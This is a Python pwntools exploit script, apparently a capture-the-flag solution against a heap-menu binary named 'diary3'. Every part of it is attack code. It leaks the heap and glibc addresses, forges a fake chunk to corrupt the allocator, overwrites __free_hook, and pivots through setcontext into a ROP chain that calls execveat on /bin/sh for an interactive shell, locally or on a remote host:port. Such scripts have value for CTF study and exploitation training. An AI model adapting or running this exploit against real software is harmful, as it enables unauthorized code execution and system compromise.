#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = 'diary3'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def write(p, size: int, data: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)


def edit(p, index: int, data: bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'Input data: ', data)


def delete(p, index: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())


def recount(p, index: int) -> bytes:
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    p.recvuntil(b'data: ')
    return p.recvuntil(b'\n1. write about dream', drop=True)


def main():
    p = get_process()

    for _ in range(9):
        write(p, 0x88, b'A')

    for i in range(9):
        delete(p, 8 - i)

    write(p, 0x88, b'X')
    heap_base_addr = (u64(recount(p, 0)[:8].ljust(8, b'\0')) & 0xfffffffffffff000) - 0x1000
    p.info(f'Heap base address: {hex(heap_base_addr)}')

    heap_base_addr -= 0x410 if len(sys.argv) > 1 else 0

    for _ in range(8):
        write(p, 0x88, b'Y')

    glibc.address = u64(recount(p, 7)[:8].ljust(8, b'\0')) - 0x1e4d59
    p.success(f'Glibc base address: {hex(glibc.address)}')

    write(p, 0xf8, b'asdf')  # 9
    write(p, 0xf8, b'qwer')  # 10
    edit(p, 9, b'A' * 0xf8)

    holder_addr = heap_base_addr + 0x2490
    victim_chunk_addr = heap_base_addr + 0x1b90
    fake_fd = holder_addr - 0x18
    fake_bk = holder_addr - 0x10

    delete(p, 9)
    write(p, 0xf8, p64(0) + p64(0xf0) + p64(fake_fd) + p64(fake_bk) + b'A' * 0xd0 + p64(0xf0))

    for _ in range(7):
        write(p, 0xf8, b'Z')

    for i in range(7):
        delete(p, 11 + 6 - i)

    write(p, 0x18, p64(victim_chunk_addr))  # 11
    delete(p, 10)

    write(p, 0x18, b'A')  # 10
    delete(p, 10)

    edit(p, 9, b'A' * 0x10 + p64(glibc.sym.__free_hook)[:7])

    pop_rax_ret_addr = glibc.address + 0x047cf8
    pop_r10_ret_addr = glibc.address + 0x12bda5
    syscall_addr     = glibc.address + 0x26bd4

    rop_chain  = p64(pop_r10_ret_addr) + p64(0)    # envp
    rop_chain += p64(pop_rax_ret_addr) + p64(322)  # sys_execveat
    rop_chain += p64(syscall_addr)

    payload  = p64(heap_base_addr + 0x1bc0)
    payload += b'A' * 16
    payload += p64(glibc.sym.setcontext + 0x35)
    payload += p64(0)                          # <-- [rdx + 0x28] = r8
    payload += p64(0)                          # <-- [rdx + 0x30] = r9
    payload += b'A' * 16                       # padding
    payload += p64(0)                          # <-- [rdx + 0x48] = r12
    payload += p64(0)                          # <-- [rdx + 0x50] = r13
    payload += p64(0)                          # <-- [rdx + 0x58] = r14
    payload += p64(0)                          # <-- [rdx + 0x60] = r15
    payload += p64(0)                          # <-- [rdx + 0x68] = rdi (dir_fd)
    payload += p64(heap_base_addr + 0x1ba0)    # <-- [rdx + 0x70] = rsi (pointer to "/bin/sh")
    payload += p64(0)                          # <-- [rdx + 0x78] = rbp
    payload += p64(0)                          # <-- [rdx + 0x80] = rbx
    payload += p64(0)                          # <-- [rdx + 0x88] = rdx (argv)
    payload += b'A' * 8                        # padding
    payload += p64(0)                          # <-- [rdx + 0x98] = rcx
    payload += p64(heap_base_addr + 0x1bc8 + len(payload) + 16) # <-- [rdx + 0xa0] = rsp, pointing to ROP chain 
    payload += rop_chain                       # <-- [rdx + 0xa8] = rcx, will be pushed

    write(p, 0x18, b'/bin/sh\0')
    write(p, 0x18, p64(glibc.address + 0x150550))
    write(p, 0x158, b'A' * 8 + payload)
    delete(p, 13)

    p.interactive()


if __name__ == '__main__':
    main()
